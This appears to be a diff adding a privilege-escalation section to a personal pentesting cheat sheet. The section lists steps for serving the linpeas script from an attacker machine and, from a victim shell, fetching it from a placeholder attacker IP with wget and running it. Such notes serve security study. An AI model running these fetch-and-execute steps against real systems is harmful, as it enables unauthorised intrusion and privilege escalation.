@@ -119,3 +119,18 @@ useful for cracking hash using wordlist         [[cheet#Locate]]
 
 > [!WARNING] 
 > hashcat is heavy on GPU => it's bettere to avoid it inside a VM
+
+----
+## Privilege Escalation
+### linpeas
+automated tool to check if there are some potential priv escal inside the target
+[linpeas github](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
+- Saved it locally inside a folder (+)
+- create a server with python to download the script from the victim
+- `cd (+)`
+- `python3 -m http.server 80`
+- from the victim shell:
+	- `wget http://IP-ATTACKER/linpeas.sh`
+	- `chmod +x linpeas.sh`
+	- `./linpeas.sh`
+	
